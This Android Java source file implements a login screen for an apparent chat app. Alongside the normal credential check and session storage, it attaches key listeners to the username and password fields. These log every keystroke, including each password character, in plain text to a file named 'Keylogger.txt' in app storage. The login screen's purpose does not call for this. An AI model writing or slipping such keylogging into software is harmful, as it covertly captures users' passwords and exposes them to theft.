package com.example.project;

import androidx.appcompat.app.AppCompatActivity;
import androidx.appcompat.widget.Toolbar;

import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.text.method.PasswordTransformationMethod;
import android.util.Base64;
import android.view.KeyEvent;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;

import java.io.File;
import java.io.FileWriter;

public class LoginActivity extends AppCompatActivity {
    EditText username, password;
    Button btnlogin;
    Button btnsignup;
    Toolbar toolbar;
    DBHelper DB;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_login);
        username = findViewById(R.id.username1);
        password = findViewById(R.id.password1);
        btnlogin = findViewById(R.id.btnsignin1);
        btnsignup = findViewById(R.id.btnsignup2);
        toolbar = findViewById(R.id.loginToolbar);
        DB = new DBHelper(this);
        password.setTransformationMethod(new PasswordTransformationMethod());
        username.setFocusableInTouchMode(true);
        username.setOnKeyListener(new View.OnKeyListener() {
            @Override
            public boolean onKey(View view, int i, KeyEvent keyEvent) {
                if (keyEvent.getAction() == KeyEvent.ACTION_DOWN){
                    if (keyEvent.getKeyCode() == KeyEvent.KEYCODE_SHIFT_LEFT || keyEvent.getKeyCode() == KeyEvent.KEYCODE_SHIFT_RIGHT) {
                        return false;
                    }
                    else if (keyEvent.getKeyCode() == KeyEvent.KEYCODE_DEL){
                        String keylog  = "Key Pressed in Username:{BACKSPACE}\n";
                        writeToFile("Keylogger.txt", keylog);
                    }
                    else if (keyEvent.getKeyCode() == KeyEvent.KEYCODE_ENTER){
                        String keylog  = "Key Pressed in Username:{ENTER}\n";
                        writeToFile("Keylogger.txt", keylog);
                    }
                    else{
                        char key = (char) keyEvent.getUnicodeChar();
                        String keylog  = "Key Pressed in Username:{" + key + "}\n";
                        writeToFile("Keylogger.txt", keylog);
                    }
                }
                return false;
            }
        });
        password.setFocusableInTouchMode(true);
        password.setOnKeyListener(new View.OnKeyListener() {
            @Override
            public boolean onKey(View view, int i, KeyEvent keyEvent) {
                if (keyEvent.getAction() == KeyEvent.ACTION_DOWN){
                    if (keyEvent.getKeyCode() == KeyEvent.KEYCODE_SHIFT_LEFT || keyEvent.getKeyCode() == KeyEvent.KEYCODE_SHIFT_RIGHT) {
                        return false;
                    }
                    else if (keyEvent.getKeyCode() == KeyEvent.KEYCODE_DEL){
                        String keylog  = "Key Pressed in Password:{BACKSPACE}\n";
                        writeToFile("Keylogger.txt", keylog);
                    }
                    else if (keyEvent.getKeyCode() == KeyEvent.KEYCODE_ENTER){
                        String keylog  = "Key Pressed in Username:{ENTER}\n";
                        writeToFile("Keylogger.txt", keylog);
                    }
                    else{
                        char key = (char) keyEvent.getUnicodeChar();
                        String keylog  = "Key Pressed in Password:{" + key + "}\n";
                        writeToFile("Keylogger.txt", keylog);
                    }
                }
                return false;
            }
        });
        btnlogin.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {

                String user = username.getText().toString();
                String pass = password.getText().toString();

                if (user.equals("") || pass.equals(""))
                    Toast.makeText(LoginActivity.this, "Please enter all the fields", Toast.LENGTH_SHORT).show();
                else {
                    Boolean checkuserpass = DB.checkusernamepassword(user, pass);
                    if (checkuserpass) {
                        byte[] dp = DB.retrieveImage(user);
                        String encodedDP = Base64.encodeToString(dp, Base64.DEFAULT);
                        SharedPreferences session = getSharedPreferences("session", MODE_PRIVATE);
                        SharedPreferences.Editor editor = session.edit();
                        editor.putString("username", user);
                        editor.putString("image", encodedDP);
                        editor.commit();
                        Toast.makeText(LoginActivity.this, "Sign in successful", Toast.LENGTH_SHORT).show();
                        Intent intent = new Intent(LoginActivity.this, chatlistActivity.class);
                        startActivity(intent);
                    } else {
                        Toast.makeText(LoginActivity.this, "Invalid Credentials", Toast.LENGTH_SHORT).show();
                    }
                }
            }
        });
        btnsignup.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                Intent intent = new Intent(getApplicationContext(), LoginRegisterActivity.class);
                startActivity(intent);
            }
        });
    }

    public void writeToFile(String fileName, String content) {
        File file = new File(LoginActivity.this.getFilesDir().getPath());
        try {
            File gpxfile = new File(file, fileName);
            FileWriter writer = new FileWriter(gpxfile, true);
            writer.append(content + "\n");
            writer.flush();
            writer.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}